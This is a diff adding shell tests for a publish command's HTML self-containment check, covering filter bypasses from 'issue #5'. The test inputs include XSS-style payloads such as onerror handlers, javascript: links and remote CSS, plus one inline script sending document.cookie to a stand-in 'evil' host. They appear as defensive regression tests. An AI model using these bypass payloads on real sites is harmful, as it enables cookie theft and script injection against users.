@@ -29,6 +29,23 @@ ns() { "$NS_REPO_ROOT/bin/ns" "$@"; }
 
 tok() { printf 'ghp_%s' "abcdefghijklmnopqrstuvwxyz0123456789"; }
 
+# refused <printf %b text>: publishing it as x.html fails with the R-DSK-2 message and copies nothing
+refused() {
+  printf '%b' "$1" >"$RUNDIR/x.html"
+  run ns publish sbx-12 RUN/x.html
+  assert_failure 1
+  assert_output_contains "x.html: HTML must be self-contained (no scripts, no external resources)"
+  [ ! -e "$DESK/runs/sbx-12/x.html" ]
+}
+
+# published <printf %b text>: publishing it as x.html succeeds and the file is on the desk
+published() {
+  printf '%b' "$1" >"$RUNDIR/x.html"
+  run ns publish sbx-12 RUN/x.html
+  assert_success
+  [ -f "$DESK/runs/sbx-12/x.html" ]
+}
+
 @test "publishing copies the file with mode 0640, records .published and index.md" {
   run ns publish sbx-12 RUN/plan.md:plan.md
   assert_success
@@ -61,7 +78,7 @@ tok() { printf 'ghp_%s' "abcdefghijklmnopqrstuvwxyz0123456789"; }
   printf '<html><script src="https://x"></script></html>\n' >"$RUNDIR/r.html"
   run ns publish sbx-12 RUN/r.html
   assert_failure 1
-  assert_output_contains "r.html: HTML must be self-contained (no external scripts or styles)"
+  assert_output_contains "r.html: HTML must be self-contained (no scripts, no external resources)"
   [ ! -e "$DESK/runs/sbx-12/r.html" ]
 }
 
@@ -79,6 +96,90 @@ tok() { printf 'ghp_%s' "abcdefghijklmnopqrstuvwxyz0123456789"; }
   run ns publish sbx-12 RUN/r.html
   assert_success
   [ -f "$DESK/runs/sbx-12/r.html" ]
+}
+
+@test "issue #5 bypass a: protocol-relative link href is refused" {
+  refused '<link rel=stylesheet href=//evil/x.css>\n'
+}
+
+@test "issue #5 bypass b: script with src on the next line is refused" {
+  refused '<script\nsrc="https://x"></script>\n'
+}
+
+@test "issue #5 bypass c: img with an https src is refused" {
+  refused '<img src="https://x">\n'
+}
+
+@test "issue #5 bypass d: inline script is refused" {
+  refused '<script>fetch("https://evil/?"+document.cookie)</script>\n'
+}
+
+@test "link with href on the next line is refused" {
+  refused '<link\nhref="https://x/a.css">\n'
+}
+
+@test "uppercase SCRIPT is refused" {
+  refused '<SCRIPT>alert(1)</SCRIPT>\n'
+}
+
+@test "single-quoted protocol-relative src is refused" {
+  refused "<img src='//x'>\n"
+}
+
+@test "unquoted http src is refused" {
+  refused '<img src=http://x>\n'
+}
+
+@test "an onerror handler is refused" {
+  refused '<img src="data:image/png;base64,AA==" onerror="fetch(1)">\n'
+}
+
+@test "a remote CSS url() is refused" {
+  refused '<p style="background:url(//x)">hi</p>\n'
+}
+
+@test "a quoted > does not end the tag early" {
+  refused '<svg><image title=">" href=//x/></svg>\n'
+}
+
+@test "a handler right after a closing quote is refused" {
+  refused '<img src="data:image/png;base64,AA=="onerror="fetch(1)">\n'
+}
+
+@test "a handler after a stray quote is refused" {
+  refused '<img src=data:x title=a"b onerror=fetch(1)>\n'
+}
+
+@test "svg href and xlink:href are refused" {
+  refused '<svg><image href="https://x"/></svg>\n'
+  refused '<svg><use xlink:href="//x#a"/></svg>\n'
+}
+
+@test "srcset, meta refresh and javascript: are refused" {
+  refused '<img srcset="a.png 1x, https://x 2x">\n'
+  refused '<meta http-equiv="refresh" content="0;url=https://x">\n'
+  refused '<a href="javascript:alert(1)">x</a>\n'
+}
+
+@test "a file with a NUL byte is refused" {
+  refused '<p>a\0b</p>\n'
+}
+
+@test "inline style, a data: image and an a href link are published" {
+  published '<style>p{color:red}</style><img src="data:image/png;base64,iVBORw0KGgo="><p><a href="https://github.com/o/r/pull/1">PR</a></p>\n'
+}
+
+@test "prose with = and a bare URL is published" {
+  published '<p>one = two, see https://x and say "onclick = no"</p>\n'
+}
+
+@test "the filled handoff template passes the check" {
+  sed 's#{{PR_URL}}#https://github.com/o/r/pull/1#g' \
+    "$NS_REPO_ROOT/plugins/ns/skills/handoff-report/template.html" >"$BATS_TEST_TMPDIR/h.html"
+  # shellcheck source=/dev/null
+  source "$NS_REPO_ROOT/bin/lib/desk.sh"
+  run ns_desk_check_html "$BATS_TEST_TMPDIR/h.html"
+  assert_success
 }
 
 @test "a file containing a token is refused" {
